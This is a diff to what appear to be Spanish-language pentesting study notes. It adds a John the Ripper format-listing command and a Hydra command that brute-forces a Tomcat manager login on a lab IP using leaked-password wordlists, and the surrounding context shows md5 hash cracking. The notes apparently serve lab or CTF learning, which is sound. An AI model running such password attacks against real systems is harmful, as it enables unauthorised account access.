@@ -353,10 +353,15 @@ john --format=raw-md5 --show hash.txt
 Para ver los formatos que acepta john ( aunque estoy confundido )
 
 ```
-
+john --list=formats
 ```
 
+## Hydra 
 
+```
+hydra -L /opt/SecLists/Usernames/top-usernames-shortlist.txt -P /opt/SecLists/Passwords/darkweb2017-top10000.txt  -f -s 8080 10.10.144.233 http-get /manager/html
+
+```
 
 ## Bibliografias 
 
